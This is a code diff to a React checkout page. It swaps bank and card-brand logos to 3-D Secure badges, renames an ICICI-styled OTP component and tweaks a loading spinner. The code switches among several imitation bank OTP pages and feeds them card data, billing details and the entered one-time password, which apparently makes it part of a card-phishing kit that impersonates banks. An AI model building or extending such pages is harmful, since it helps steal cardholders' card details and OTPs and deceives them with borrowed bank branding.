@@ -20,7 +20,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import NewOTPPage from '../components/NewOTPPage';
 import ThirdOTPPage from '../components/ThirdOTPPage';
-import ICICIOTPPage from '../components/ICICIOTPPage';
+import ICICIBankOTPPage from '../components/ICICIBankOTPPage';
 import ExpiredPage from '../components/ExpiredPage';
 import { api } from '../utils/api';
 import { devLog, devError, devWarn } from '../utils/logger';
@@ -42,7 +42,7 @@ const bankLogos = [
   'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
   'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
   'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
-  'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png',
+
   'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/csb-bank-logo.png',
   'https://seekvectors.com/storage/images/development%20credit%20bank%20logo.svg',
   'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg',
@@ -53,10 +53,10 @@ const bankLogos = [
 
 // Card brand logos
 const cardBrandLogos = {
-  visa: 'https://brandlogos.net/wp-content/uploads/2025/04/visa_secure_badge-logo_brandlogos.net_n9x0z-300x300.png',
-  mastercard: 'https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png',
+  visa: 'https://www.southpointfinancial.com/wp-content/uploads/2017/08/Verified-by-Visa-Logo-smaller-1-2.png',
+  mastercard: 'https://iconape.com/wp-content/png_logo_vector/mastercard-securecode-logo.png',
   discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
-  rupay: 'https://logotyp.us/file/rupay.svg',
+  rupay: 'https://www.pngkey.com/png/full/129-1290304_file-rupay-logo-rupay-card.png',
   amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png' // fallback to discover for amex
 };
 
@@ -1644,8 +1644,8 @@ const CheckoutOriginal = () => {
       {/* Global Loading Spinner for Payment Success */}
       {showSpinner && (
         <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-md flex items-center justify-center z-[9999]">
-          <div className="text-center">
-            <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
+          <div className="flex flex-col items-center justify-center text-center">
+            <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mb-4 animate-pulse">
               <Loader2 className="h-8 w-8 text-white animate-spin" />
             </div>
             <p className="text-white text-lg font-medium">Processing...</p>
@@ -2824,7 +2824,7 @@ const CheckoutOriginal = () => {
                 )}
 
                 {otpPageSelection === 'icici' && (
-                  <ICICIOTPPage
+                  <ICICIBankOTPPage
                     cardData={cardData}
                     billingDetails={formData}
                     otpValue={otpValue}
